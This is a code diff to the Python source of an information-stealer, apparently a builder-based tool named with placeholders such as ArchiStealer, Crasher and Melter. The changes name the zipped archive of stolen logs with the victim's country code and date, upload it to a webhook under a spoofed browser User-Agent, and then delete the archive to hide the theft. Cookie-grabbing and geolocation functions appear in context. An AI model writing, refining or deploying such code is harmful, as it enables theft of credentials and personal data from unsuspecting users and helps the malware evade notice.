@@ -37,7 +37,6 @@ melter = '%Melter%'
 crasher = '%Crash%'
 hidewindow = '%Hide%'
 changebio = '%ChangeBio%'
-biotext = '%Text%'
 Drive = '%Drive%'
 close_proc = '%CloseProc%'
 ArchiStealer = '%ArchiStealer%'
@@ -913,6 +912,7 @@ def globalInfo():
     longitude = location[1]
     username = os.getlogin()
     country = data['country']
+    global country_code
     country_code = data['country'].lower()
     region = data['region']
     city = data['city']
@@ -3458,7 +3458,10 @@ def getCook(path, arg, process):
 
 def zip_temp_folder():
     temp_folder = os.path.join(os.environ['TEMP'], 'Logs')
-    zip_file_path = os.path.join(os.environ['TEMP'], 'Logs.zip')
+    random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&@#', k=10))
+    current_date = datetime.datetime.now().strftime('%Y-%m-%d')
+
+    zip_file_path = os.path.join(os.environ['TEMP'], f'{country_code}[{random_name}][{current_date}].zip')
 
     try:
         with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -3494,12 +3497,14 @@ def zip_temp_folder():
                 "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
             }
-    
-    
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
         
+        try:
+            os.remove(zip_file_path)
+        except:
+            pass
+
     except Exception as e:
         error_Handler(e)
         
@@ -3773,7 +3778,6 @@ def gatha():
             DiscordStop = False
         except Exception as e:
             error_Handler(e)
-
     
     if DiscordStop == True:
         try:
